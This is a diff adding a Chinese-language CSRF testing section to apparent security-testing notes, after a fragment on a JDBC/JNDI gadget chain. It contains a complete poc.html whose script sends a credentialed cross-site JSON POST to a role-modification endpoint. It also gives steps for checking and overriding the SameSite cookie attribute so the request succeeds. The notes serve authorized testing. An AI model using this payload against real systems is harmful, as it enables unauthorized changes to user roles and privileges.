@@ -58,6 +58,107 @@ context.lookup(dataSourceName); // 触发 JNDI 查询
 
 所以这个gadget应该描述为：JdbcRowSetImpl.setDataSourceName ——> JdbcRowSetImpl.setAutoCommit ——> connect() ——> lookup()
 
+## 三 CSRF（跨站请求伪造）
+
+### 3.1 技术原理
+
+
+
+### 3.2 测试验证
+
+使用burpsuite工具生成csrf请求的poc时，通常默认将content-type设置为text/plain，导致生成的poc无法直接验证csrf问题（此问题待研究...）
+
+建议使用AI工具，将一些**可以修改系统状态**的请求作为原始请求，生成一份验证POC，在本地起web服务，通过http://127.0.0.1:8000/poc.html 的形式访问，进行验证
+
+```
+# 在MacOS上可以使用的方法：在poc.html目录下命令行执行
+python3 -m http.server 8000 --bind 127.0.0.1
+
+# 然后在已登录了合法用户的同一浏览器中访问 http://127.0.0.1:8000/poc.html
+
+# 验证结束后可以Ctrl+C来终止服务
+
+# 比如某个系统的修改系统用户角色的接口，可以通过这样的方式生成poc.html
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF JSON 请求验证</title>
+</head>
+<body>
+  <p>仅修改专用测试角色备注，提交后到正常后台核对。</p>
+  <button id="test">提交测试</button>
+  <pre id="result"></pre>
+
+  <script>
+    document.querySelector("#test").onclick = async () => {
+      const output = document.querySelector("#result");
+      output.textContent = "正在测试……";
+
+      try {
+        const response = await fetch(
+          "https://example.com/role/modify",
+          {
+            method: "POST",
+            credentials: "include",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              roleId: "176829229416901",
+              name: "安全测试角色",
+              remark: "csrf-json-check-01",
+              status: "enable"
+            })
+          }
+        );
+
+        const body = await response.text();
+
+        output.textContent =
+          "JS 可以读取响应，HTTP 状态：" + response.status +
+          "\n这不代表操作成功，请检查业务结果并核对角色备注。\n\n" +
+          body;
+      } catch (error) {
+        output.textContent =
+          "浏览器报告请求或响应读取失败：" + error.message +
+          "\n请在 Network 中检查 OPTIONS 和实际 POST，" +
+          "并到正常后台核对备注是否改变。";
+      }
+    };
+  </script>
+</body>
+</html>
+```
+
+一般情况下，比如在现代浏览器中（如chrome）访问这个poc.html后，会返回401，并提示用户未登录，原因是请求未自动携带cookie
+
+```
+# 如何确认原因？
+
+1. 在被测系统页面，打开开发者工具——Application——Storage——Cookie，点击对应的域名，查看认证使用的Access Token，其samesite属性多半是Lax
+2. 如果Samesite属性是Lax，则说明该应用网关上已经设置了限制跨域的安全策略，跨域请求是禁止携带cookie的
+3. 如果Samesite属性是空，由于现代浏览器在samesite为空（注意不是none）时，默认按照Lax执行
+4. 同时，可以通过你的poc.html的请求页面——开发者工具——Network——POST请求——Cookies，依次
+    - 勾选“Show filtered-out request cookies”
+    - 找到对应域名的access token
+    - 鼠标悬停在samesite属性的感叹号上，稍等一会，会显示被拦截的原因（一般会是识别到跨域请求，浏览器默认设置为lax）
+
+```
+
+那么该如何验证呢？
+
+```
+1. 回到待测系统的访问页面，打开开发者工具——Application——Storage——Cookies，找到对应域名的access token
+2. 将access token的samesite属性设置为None，注意不是置空
+3. 回到验证poc.html的请求页面，再次发起请求
+
+这样会看到请求成功，并且成功修改了角色状态
+```
+
+这样的结果能说明什么呢？
+
+证明只要浏览器客户端支持跨域请求，那么就可以实现csrf攻击，应用侧存在csrf防御机制缺失的问题。
 
 
 # 多租户Agent安全 & SaaS多租户权限架构
